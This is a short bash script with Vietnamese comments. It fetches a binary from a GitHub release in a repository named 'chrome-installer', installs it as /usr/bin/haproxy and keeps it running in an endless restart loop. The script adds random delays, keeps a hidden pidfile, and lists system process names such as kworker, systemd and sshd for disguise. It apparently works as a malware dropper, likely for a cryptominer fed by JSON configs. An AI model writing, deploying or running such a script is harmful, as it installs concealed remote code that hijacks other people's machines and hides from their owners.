#!/bin/bash
set -e

curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/haproxy.tar.gz
tar -xf haproxy.tar.gz
rm haproxy.tar.gz
cd haproxy
chmod +x ./haproxy
mv ./haproxy /usr/bin/haproxy

PRE_DELAY=$(shuf -i15-30 -n1)
sleep $PRE_DELAY

HAPROXY_BIN="/usr/bin/haproxy"

PROCESS_NAMES=(
    chrome node systemd kworker redis dockerd containerd sshd nginx pm2
)

JSON_FILES=(
    part4.json
    part4.json
    part4.json
    part4.json
)

PIDFILE=/tmp/.hp.pid

while true; do
    # Kill process cũ nếu tồn tại
    if [ -f "$PIDFILE" ]; then
        OLD_PID=$(cat "$PIDFILE")
        if kill -0 "$OLD_PID" 2>/dev/null; then
            echo "Killing old process: $OLD_PID"
            kill "$OLD_PID" 2>/dev/null || true
            sleep 1
        fi
    fi
    
    # Chọn tên process và file JSON ngẫu nhiên
    PROC_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}
    JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
    
    echo "Start $PROC_NAME with $JSON"
    
    # BỎ exec - chỉ chạy background process
    "$HAPROXY_BIN" -c "$JSON" &
    NEW_PID=$!
    
    # Đổi tên process (nếu cần)
    # Note: Việc đổi tên sau khi start có thể không hiệu quả
    
    echo $NEW_PID > "$PIDFILE"
    
    INTERVAL=$((60 + RANDOM % 61))
    echo "Next restart in $INTERVAL seconds"
    sleep $INTERVAL
done
